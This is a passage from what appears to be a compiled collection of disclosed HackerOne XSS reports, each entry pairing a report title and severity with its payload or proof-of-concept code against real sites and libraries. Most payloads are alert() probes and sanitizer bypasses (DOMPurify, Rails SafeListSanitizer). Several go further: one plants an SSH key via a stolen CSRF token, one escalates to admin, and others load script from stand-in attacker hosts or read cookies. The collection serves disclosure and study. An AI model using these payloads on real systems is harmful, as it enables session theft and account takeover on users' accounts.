	$link_html = $matches[1];
	$rel_match = array();
...
// Value with delimiters, spaces around are optional.
	$attr_regex = '|rel\s*=\s*?(\\\\{0,1}["\'])(.*?)\\1|i';
	preg_match( $attr_regex, $link_html, $rel_match );

	if ( empty( $rel_match[0] ) ) {
		// No delimiters, try with a single value and spaces, because `rel =  va"lue` is totally fine...
		$attr_regex = '|rel\s*=(\s*)([^\s]*)|i';
		preg_match( $attr_regex, $link_html, $rel_match );
	}
```

## 247. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'"yvvdwf=here&gt;&lt;img/src="0"onerror="alert(0)"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl>
```

## 248. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```html
<style><img/src="0"onerror="alert(0)"></style>
```

## 249. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```html
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

## 250. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```html
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

## 251. [#1010132](https://hackerone.com/reports/1010132)  -  Possible DOM XSS on app.hey.com
*high*

```
TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
```

## 252. [#1339034](https://hackerone.com/reports/1339034)  -  Blind XSS via Feedback form.
*high*

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

## 253. [#1579645](https://hackerone.com/reports/1579645)  -  XSS: `v-safe-html` is not safe enough
*high*

```html
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

## 254. [#1579645](https://hackerone.com/reports/1579645)  -  XSS: `v-safe-html` is not safe enough
*high*

```yaml
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: echo "hi"
  dependencies:
    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
```

## 255. [#333008](https://hackerone.com/reports/333008)  -  Persistent XSS in https://sandbox.reverb.com/item/
*high*

```
https://soundcloud.com/rich-the-kid/sets/the-world-is-yours-15?fuzzing" onload=alert(document.domain) x="
```

## 256. [#771882](https://hackerone.com/reports/771882)  -  Хранимый XSS в Business-аккаунте, на странице компании
*high*

```html
<svg/onload=confirm(document.domain)>
```

## 257. [#3400506](https://hackerone.com/reports/3400506)  -  Stored XSS in Conversion Statistics via Tracker Name
*high*

```html
<img src=x onerror="alert('XSS: ' + document.cookie)">
```

## 258. [#3400506](https://hackerone.com/reports/3400506)  -  Stored XSS in Conversion Statistics via Tracker Name
*high*

```
XSS: sessionID=abc123; ox_install_session_id=def456
```

## 259. [#684268](https://hackerone.com/reports/684268)  -  Stored XSS for Grafana dashboard URL
*high*

```
javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });
```

## 260. [#867133](https://hackerone.com/reports/867133)  -  Stored XSS on https://apps.topcoder.com/wiki/pages/editpage.action
*high*

```json
{vote:What is your favorite vulnerability?}
RCE
SSRF
XSS"><img src=X onerror=alert(document.domain)>
{vote}
```

## 261. [#317125](https://hackerone.com/reports/317125)  -  [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
*high*

```html
<strong>Hello bl4de<script>console.log("uh oh, XSS... :(")</script></strong>
```

## 262. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```
${metadata.title}
```

## 263. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```
${metadata.publisher}
```

## 264. [#344069](https://hackerone.com/reports/344069)  -  The react-marked-markdown module allows XSS injection in href values.
*critical*

```json
{{ sanitize: true }}
```

## 265. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```html
<script
  src="https://fast.wistia.com/embed/medias/t306dw04gl.jsonp"
  async=""
></script>
```

## 266. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```html
<script src="https://fast.wistia.com/assets/external/E-v1.js" async=""></script>
```

## 267. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```html
<script src="//code.angularjs.org/1.8.0/angular.js"></script>
```

## 268. [#3581911](https://hackerone.com/reports/3581911)  -  Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass
*low, $337*

```html
<script src="https://cdn.jsdelivr.net/npm/trix@2.1.16/dist/trix.umd.min.js"></script>
```

## 269. [#335481](https://hackerone.com/reports/335481)  -  [Zomato's Blog] POST based XSS on https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2
*low, $100*

```html
<script>prompt&#40;document.domain)</script>
```

## 270. [#2303609](https://hackerone.com/reports/2303609)  -  XSS when using `translate` in Action Controller (Rails 7.0, 7.1)
*low*

```html
<script>alert(location)</script>
```

## 271. [#437863](https://hackerone.com/reports/437863)  -  SVG file that HTML Included is able to upload via File Manager
*low*

```html
<script>alert('xss');</script>
```

## 272. [#3404968](https://hackerone.com/reports/3404968)  -  Stored-XSS in Banner Name field
*low*

```html
<script> tag.**

##Step to reproduce:
1. Go to Banners → Create (or edit an existing banner).
2. In the ==Name field==, insert the payload: `"><script>alert(1)</script>
```

## 273. [#388527](https://hackerone.com/reports/388527)  -  Self xss
*low*

```html
<script>alert(205)</script>
```

## 274. [#284082](https://hackerone.com/reports/284082)  -  Javascript Payload reflected Back in Report Embed Code
*low*

```html
<script type="text/javascript">alert(document.cookie);</script>
```

## 275. [#310133](https://hackerone.com/reports/310133)  -  [glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser
*low*

```html
<script type="text/javascript" src="http://attacker.server/malware.js"></script>
```

## 276. [#856836](https://hackerone.com/reports/856836)  -  Stored XSS on PyPi simple API endpoint
*medium, $3,000*

```html
<!DOCTYPE html>
        <html>
          <head>
            <title>Links for package_test_1</title>
          </head>
          <body>
            <h1>Links for package_test_1</h1>
            <a href="https://gitlab.com/api/v4/projects/18315917/packages/pypi/files/lala.txt#sha256=" data-requires-python=""><script>alert(1)</script>">lala.txt</a><br>
          </body>
        </html>
```

## 277. [#1805899](https://hackerone.com/reports/1805899)  -  CVE-2022-23519: Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)
*medium, $2,400*

```
irb(main):016:0> require 'rails-html-sanitizer'
=> false
irb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
=> "<svg><style><script>alert(1)</script></style></svg>"
irb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
=> "<math><style><img src=x onerror=alert(1)></style></math>"
irb(main):019:0> puts Rails::Html::Sanitizer::VERSION
1.4.3
=> nil
```

## 278. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

## 279. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```
frag = "<select><style><script>alert(1)</script></style></select>"
tags = %w(select style)
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

## 280. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```html
<select><style><script>alert(1)</script></style></select>
```

## 281. [#262230](https://hackerone.com/reports/262230)  -  Tinymce 2.4.0
*medium, $2,000*

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
```

## 282. [#293689](https://hackerone.com/reports/293689)  -  Query parameter reordering causes redirect page to render unsafe URL
*medium, $1,500*

```
https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=JAVASCRIPT:alert%09(document.domain)
```

## 283. [#313250](https://hackerone.com/reports/313250)  -  Xss was found by exploiting the URL markdown on http://store.steampowered.com
*medium, $1,000*

```json
[url=google.com:/onclick='alert(document.domain)'[url=]]xss[/url]
```

## 284. [#409986](https://hackerone.com/reports/409986)  -  Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS
*medium, $500*

```
#1  0x00007f511550494a in apr_socket_sendv (sock=sock@entry=0x7f5115c230a0, vec=vec@entry=0x7fffa5bf4f80, nvec=nvec@entry=3,
    len=len@entry=0x7fffa5bf4ee0) at ./network_io/unix/sendrecv.c:212
#2  0x0000557484512389 in writev_nonblocking (s=s@entry=0x7f5115c230a0, vec=0x7fffa5bf4f80, nvec=3, bb=0x7f5115c23910,
    cumulative_bytes_written=0x7f5115c23848, c=0x7f5115c23290) at core_filters.c:787
#3  0x0000557484512684 in send_brigade_nonblocking (s=s@entry=0x7f5115c230a0, bb=bb@entry=0x7f5115c23910,
    bytes_written=bytes_written@entry=0x7f5115c23848, c=c@entry=0x7f5115c23290) at core_filters.c:704
#4  0x00005574845133c1 in send_brigade_blocking (c=0x7f5115c23290, bytes_written=0x7f5115c23848, bb=0x7f5115c23910, s=0x7f5115c230a0)
    at core_filters.c:733
#5  ap_core_output_filter (f=0x7f5115c236e8, new_bb=0x7f5115c23910) at core_filters.c:542
#6  0x000055748452ff61 in ap_process_request (r=r@entry=0x7f5115c050a0) at http_request.c:477

(gdb) p vec[2]
$4 = {iov_base = 0x7f5115c1b17b, iov_len = 27}
(gdb) p (char *)0x7f5115c1b17b
$5 = 0x7f5115c1b17b "<script>alert(1)</script>\r\n"
```

## 285. [#2051085](https://hackerone.com/reports/2051085)  -  Stored XSS on promo.indrive.com
*medium, $284*

```json
{"id":"4","activationDate":"<script>alert(1)</script>"}
```

## 286. [#2279346](https://hackerone.com/reports/2279346)  -  CSP bypass on PortSwigger.net using Google script resources
*medium*

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

## 287. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```html
<img src=x onerror="location='https://attacker.example/drive-by-download'">
```

## 288. [#1237321](https://hackerone.com/reports/1237321)  -  CSRF to Reflected XSS at echo.urbandictionary.biz via spoofing content type
*medium*

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://echo.urbandictionary.biz/xsxsxs.html" method="POST" enctype="text/plain">
      <input type="hidden" name="&#13;&#10;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 289. [#988272](https://hackerone.com/reports/988272)  -  stored XSS in hey.com message content
*medium*

```
From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
    style>
</style>
  </head>
<style></style>
  <body>

<svg><![CDATA[><image xlink: src="]]><img src=xx:x onerror=alert(2)//"></svg>
<li style=onerror:jkj/onerror=alert(1); =''ds></li>
    </div>
  </body>
</html>
```

## 290. [#1068477](https://hackerone.com/reports/1068477)  -  RXSS in https://jp.mcafee.com/apps/mdm/jp/3.0_asp/
*medium*

```html
<html>
<head>
	<title>McAfee: スクリプトの有効化</title>
	<link rel="stylesheet" type="text/css" href="http://jp.mcafee.com/common/stylesheets/general.css">
</head>

	<script language=javascript>
	function onClickBack()
	{
		window.location.replace ("");alert(document.domain);//");
	}
	</script>

<body>
```

## 291. [#1238528](https://hackerone.com/reports/1238528)  -  wp-embed XSS on Safari
*medium*

```
> var a = document.createElement("a")
> a.href="javascript://google.com/%0aalert(document.domain);//"
> console.log(a.host)
< google.com
```

## 292. [#1238528](https://hackerone.com/reports/1238528)  -  wp-embed XSS on Safari
*medium*

```html
<script>
if(document.location.hash.indexOf("secret") != -1) {
  secret = document.location.hash.split("=")[1];
  window.top.postMessage({"secret":secret,"message":"link","value":"javascript://"+document.location.host+"/%0aalert(document.domain);//"},"*");
}
</script>
```

## 293. [#3091390](https://hackerone.com/reports/3091390)  -  Reflected Cross-Site Scripting (XSS) in Revive Adserver 5.5.2
*medium*

```
http://target-ip/www/admin/admin-search.php?affiliate=1&banner=1&campaign=1&client=1&compact=1'><script>alert(document.cookie)</script>&keyword=1&zone=1
```

## 294. [#324303](https://hackerone.com/reports/324303)  -  DOM Based XSS in mycrypto.com
*medium*

```
https://mycrypto.com/#send-transaction<div/class="header__wrap"><a/href=javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif></div>
```

## 295. [#324303](https://hackerone.com/reports/324303)  -  DOM Based XSS in mycrypto.com
*medium*

```html
<a href="javascript:alert(0)">click here</a>
```

## 296. [#507957](https://hackerone.com/reports/507957)  -  Stored XSS on www.starbucks.com.sg/careers/career-center/career-landing-*
*medium*

```
<a href="https://obatkebaskesemutan.wordpress.com/" rel="dofollow noopener" style="z-index:9999999999999999;oncontextmenu:return false;onkeydown:return false;onmousedown:return false;position:fixed;top:0px !important;left:0px;width:100%;height:100%;color:transparent !important;display:block;text-align:center;font-size:0px;background-color:transparent;background-position:center;background-repeat:no-repeat;background-size:cover;" target="_blank" title="Obat Herbal">Obat Kebas</a>
```

## 297. [#806571](https://hackerone.com/reports/806571)  -  Stored XSS in blob viewer
*medium*

```json
{
  "swagger" : "2.0",
  "info" : {
    "description" : "<a href=https://gitlab.com/yvvdwf/data/-/wikis/alert.md data-type=script style='cursor:default' data-remote=true class='atwho-view select2-drop-mask pika-select'></a><script>alert(0)</script>"
  }}
```

## 298. [#1196958](https://hackerone.com/reports/1196958)  -  Clipboard DOM-based XSS
*medium*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clipboard-XSS</title>
</head>
<body>
    <h3>Try out our new clipboard plugin</h3>
    <p>Copy <strong>here</strong>, paste it on the editor and see what happens!</p>
    <script>
        document.oncopy = event => {
            event.preventDefault();
            event.clipboardData.setData('text/x-gfm-html', 'XSS<img/src/onerror=alert(1)>');
            console.log("updated clipboard");
        }
    </script>
</body>
</html>
```

## 299. [#380045](https://hackerone.com/reports/380045)  -  Stored XSS in the guide's GameplayVersion (www.dota2.com)
*medium*

```
if (oSession.uriContains("/cloud/CB/")) {
    var strBody=oSession.GetRequestBodyAsString();       
    strBody=strBody.replace("mvc123<svg/onload=alert(document.domain)>","mvc123");
    strBody=strBody.replace("7.18","7.18<svg/onload=alert(document.domain)>");
    oSession.utilSetRequestBody(strBody);       
}
```

## 300. [#320679](https://hackerone.com/reports/320679)  -  [growth.grab.com] Reflected XSS via Base64-encoded "q" param on "my.html" Valentine's microsite
*medium*

```json
{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://r.grab.com/test%0aalert(document.domain)", "prf_reward": "10"}
```

## 301. [#1024734](https://hackerone.com/reports/1024734)  -  DOMPurify bypass
*medium*

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="./purify.js"></script>
    <title>DOMPurify bypass</title>
</head>

<body>
    <script>
        const html='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">';
        const sanitized = DOMPurify.sanitize(html);
        let div = document.createElement('div');
        div.innerHTML = sanitized;
    </script>
</body>

</html>
```

## 302. [#1184379](https://hackerone.com/reports/1184379)  -  XSS on Brave Today through custom RSS feed
*medium*

```html
<entry>
  <title>XSS</title>
  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
  <content type="html"><![CDATA[<img src="https://csrf.jp/test.png">]]></content>
</entry>
```

## 303. [#196846](https://hackerone.com/reports/196846)  -  Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)
*medium*

```
https://shop.starbucks.de/<>javascript:alert(document.cookie);
https://teavana.com/<>javascript:alert(document.cookie);
https://store.starbucks.com/<>javascript:alert(document.cookie);
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
```

## 304. [#889041](https://hackerone.com/reports/889041)  -  DOM XSS through ads
*medium*

```html
<script type='text/javascript'>
url='https://vap3ord1.lijit.com/res/sovrn.containertag.new.min.js…252de1&loc=https://www.urbandictionary.com/define.php?term=#asdf'-alert(document.domain)-'',
```

## 305. [#1164853](https://hackerone.com/reports/1164853)  -  Stored Cross Site Scripting at http://www.grouplogic.com/ADMIN/store/index.cfm?fa=disprocode
*medium*

```
Payload 1:
----------
<h1 onmouseover=alert(document.domain)>XSS</h1>

Payload 2:
----------
<img src=x onerror=alert(1)>
```

## 306. [#245172](https://hackerone.com/reports/245172)  -  Double Stored Cross-Site scripting in the admin panel
*medium*

```
javascript:alert(document.domain)
```

## 307. [#245172](https://hackerone.com/reports/245172)  -  Double Stored Cross-Site scripting in the admin panel
*medium*

```
javascript:alert(document.domain);
```

## 308. [#282209](https://hackerone.com/reports/282209)  -  Stored XSS in the Custom Logo link (non-Basic plan required)
*medium*

```
javascripT://https://google.com%0aalert(1);//https://google.com
```

## 309. [#570563](https://hackerone.com/reports/570563)  -  [http-file-server] Stored XSS in the filename when directories listing
*medium*

```
" onmouseover=alert(1) "
```

## 310. [#1244722](https://hackerone.com/reports/1244722)  -  XSS at http://nextapps.mtnonline.com/search/suggest/q/{xss payload}
*medium*

```
http://nextapps.mtnonline.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```

## 311. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

## 312. [#463380](https://hackerone.com/reports/463380)  -  [webpack-bundle-analyzer] Cross-site Scripting
*medium*

```json
{
  "outputPath": "./dist",
  "assets": [
    {
      "name": "</script><script>alert(1)</script>main.js",
      "chunks": [0],
      "chunkNames": ["main"]
    }
  ]
}
```

## 313. [#463380](https://hackerone.com/reports/463380)  -  [webpack-bundle-analyzer] Cross-site Scripting
*medium*

```
node_modules/some-module-that-we-control/
├── <
│   └── script><script>alert(1)<
│       └── script>module-name-that-is-included-in-index.js
├── index.js
└── package.json
```

## 314. [#463380](https://hackerone.com/reports/463380)  -  [webpack-bundle-analyzer] Cross-site Scripting
*medium*

```javascript
<script>
    window.chartData = [
{"some-data-here":
"and here</script><script>alert(1)</script>module-name-that-is-included-in-index.js",
"more-data":[]}
];
    window.defaultSizes = "parsed";
    window.enableWebSocket = true;
</script>
```

## 315. [#287562](https://hackerone.com/reports/287562)  -  Stored XSS in content when Graph is created via API
*medium*

```
public static void main(String[] args) {
        InfogramAPI infogram = new InfogramAPI([API-Key], [API-Secret]);

        Map<String, String> parameters = new HashMap<String, String>();

        //parameters = null;

        parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]");
        parameters.put("theme_id", "7291");
        parameters.put("title","title");
        parameters.put("publish", "true");
        parameters.put("publish_mode", "public");
        
        try {
            Response response = infogram.sendRequest("POST", "infographics", parameters);

            if (response.isSuccessful()) {
                InputStream is = response.getResponseBody();
                System.out.print(getStringFromInputStream(is).replace(",", ",\n"));
                
            } else {
                String errmsg = String.format("The server returned %d %s", response.getHttpStatusCode(), response.getHttpStatusMessage());
                System.err.println(errmsg);
            }
        } catch (IOException e) {
            System.err.println("There was a problem connecting to the server");
            e.printStackTrace();
        }
    }
# … truncated …
```

## 316. [#374100](https://hackerone.com/reports/374100)  -  Reflected xss in Serendipity's /index.php
*medium*

```html
<nav class="serendipity_pagination block_level">
        <h2 class="visuallyhidden">Pagination</h2>

        <ul class="clearfix">
                        <li class="info"><span>Page 1 of 3, totaling 34 entries</span></li>
                        <li class="prev">&nbsp;</li>
            <li class="next"><a href="https://blog.fuzzing-project.org/categories/1\'\"()&%<%20><ScRiPt >prompt(1)</ScRiPt>-multi/P2.html">next page &rarr;</a></li>
        </ul>
    </nav
```

## 317. [#691977](https://hackerone.com/reports/691977)  -  [reveal.js] XSS by calling arbitrary method via postMessage
*medium*

```html
<script>
    var win = window.open ('https://revealjs.com')
    
    function xss ()
    {
        win.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
        win.postMessage ('{"method":"toggleHelp"}', '*')
    }
    
    setTimeout (xss, 500)
</script>
```

## 318. [#289313](https://hackerone.com/reports/289313)  -  [gem server] Stored XSS via crafted JavaScript URL inclusion in Gemspec
*medium*

```
Gem::Specification.new do |s|
  s.name = 'securitytest'
  s.version = '0.1.0'
  s.date = '2017-11-10'
  s.summary = "This is a proof-of-concept gem"
    s.description = "Select the WWW hyperlink."
    s.authors = ["Author Name"]
  s.homepage = 'javascript:confirm(document.domain)'
end
```

## 319. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```html
<script>alert(`xss!`)</script>
```

## 320. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```html
<table>
        <tbody><tr>
            <td><script>alert(`xss!`)</script></td>
            <td>test</td>
            <td>another</td>
        </tr>
        <tr>
            <td>1</td>
            <td>2</td>
            <td>3</td>
        </tr>
    </tbody></table>
```

## 321. [#328210](https://hackerone.com/reports/328210)  -  [sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name
*medium*

```html
<!-- malware_frame.html -->
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware downloader :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

## 322. [#373950](https://hackerone.com/reports/373950)  -  Reflected Cross-Site Scripting in Serendipity (serendipity.SetCookie)
*medium*

```php
<?php
// [...]
function serendipity_JSsetCookie($name, $value) {
    $name  = serendipity_entities($name);
    $value = urlencode($value);

    echo '<script type="text/javascript">serendipity.SetCookie("' . $name . '", unescape("' . $value . '"))</script>' . "\n";
}
```

## 323. [#395734](https://hackerone.com/reports/395734)  -  XSS in Subdomain of DuckDuckGo
*medium*

```html
<html><script>alert(document.domain);</script></html>
```

## 324. [#694930](https://hackerone.com/reports/694930)  -  [snekserve] Stored XSS via filenames HTML formatted
*medium*

```html
<!-- malicious.html -->
<script>alert(document.domain)</script>
```

## 325. [#331110](https://hackerone.com/reports/331110)  -  [buttle] HTML Injection in filename leads to XSS when directory listing is displayed in the browser
*medium*

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <!-- <script type="text/javascript" src="malware.js"></script> -->
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

## 326. [#1106238](https://hackerone.com/reports/1106238)  -  Stored XSS via Mermaid Prototype Pollution vulnerability
*high, $3,000*

```
${cnf.themeCSS}
```

## 327. [#1106238](https://hackerone.com/reports/1106238)  -  Stored XSS via Mermaid Prototype Pollution vulnerability
*high, $3,000*

```
${cnf.fontFamily}
```

## 328. [#1106238](https://hackerone.com/reports/1106238)  -  Stored XSS via Mermaid Prototype Pollution vulnerability
*high, $3,000*

```
${cnf.altFontFamily}
```

## 329. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```
${encodeURIComponent(a.value)}
```

## 330. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```
${encodeURIComponent(b.value)}
```

## 331. [#3115705](https://hackerone.com/reports/3115705)  -  Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
*high*

```
${workspaceId}
```

## 332. [#3115705](https://hackerone.com/reports/3115705)  -  Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
*high*

```
${attackerUserId}
```

## 333. [#3115705](https://hackerone.com/reports/3115705)  -  Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
*high*

```
${userData.user.username}
```

## 334. [#3115705](https://hackerone.com/reports/3115705)  -  Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
*high*

```
${userData.user.email}
```

## 335. [#1392262](https://hackerone.com/reports/1392262)  -  Stored XSS via LINK Name.
*high*

```json
{{'7'*7}}
```

## 336. [#1588732](https://hackerone.com/reports/1588732)  -  CSP-bypass XSS in project settings page
*high*

```
${isActiveClass}
```

## 337. [#1588732](https://hackerone.com/reports/1588732)  -  CSP-bypass XSS in project settings page
*high*

```
${key.title}
```

## 338. [#1588732](https://hackerone.com/reports/1588732)  -  CSP-bypass XSS in project settings page
*high*

```
${key.avatar_url}
```

## 339. [#1588732](https://hackerone.com/reports/1588732)  -  CSP-bypass XSS in project settings page
*high*

```
${key.username}
```

## 340. [#2371019](https://hackerone.com/reports/2371019)  -  DOM XSS on multiple Automattic domains through postMessages
*high*

```
${ encodeURI( liker.profile_URL ) }
```

## 341. [#2371019](https://hackerone.com/reports/2371019)  -  DOM XSS on multiple Automattic domains through postMessages
*high*

```
${ liker.avatar_URL }
```

## 342. [#1212067](https://hackerone.com/reports/1212067)  -  Stored XSS in markdown via the DesignReferenceFilter
*critical, $16,000*

```ruby
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

## 343. [#309648](https://hackerone.com/reports/309648)  -  [simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML
*critical*

```javascript
// Check for each file if it's a directory or a file
    var q = async.queue(function(item, cb) {
        fs.stat(path.join(pathname, item), function(err, stat) {
           if ( !stat ) cb();
           if ( stat.isDirectory() ) {
